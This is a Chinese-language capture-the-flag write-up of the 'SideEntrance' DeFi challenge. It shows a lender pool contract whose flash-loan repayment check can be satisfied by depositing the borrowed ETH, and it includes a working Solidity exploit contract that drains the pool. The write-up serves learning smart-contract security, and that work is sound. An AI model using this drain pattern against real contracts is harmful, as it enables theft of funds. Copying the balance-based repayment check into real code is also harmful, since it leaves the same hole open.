# SideEntrance (24/09/03)

## 题目介绍

> **#侧入口**
>
> **一个令人惊讶的简单池允许任何人存入ETH，并随时提取ETH。**
>
> **它已经有1000个ETH的余额，并正在使用存入的ETH提供免费的闪贷款来推广他们的系统。**
>
> **Yoy从1 ETH开始平衡。通过从池中拯救所有ETH并将其存入指定的恢复账户来通过挑战。**

## 合约分析

就一个文件，一个闪电贷一个存款和取款函数。闪电贷根据余额来判断是否进行还款。

``` solidity
    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];

        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore) {
            revert RepayFailed();
        }
    }
```



## 解题过程

我们可以从代码中看到这是一个很明显的重入漏洞，调用闪电贷的时候直接存款会把攻击者的余额记录起来，同时也满足最后还款的检查。在最后调用取款直接把资金提走。

**poc**

``````solidity
contract Exploit {

    SideEntranceLenderPool pool;
    address payable public  recovery;

    constructor(SideEntranceLenderPool _pool,address payable _recovery){
        pool=_pool;
        recovery=_recovery;
    }
    function attack()public{
        pool.flashLoan(address(pool).balance);
        //最后取款
        pool.withdraw();
        recovery.transfer(address(this).balance);
    }
    //重入存款完成攻击
    function execute()public payable{
        pool.deposit{value: address(this).balance}();
    }

  receive() external  payable {}
}
``````
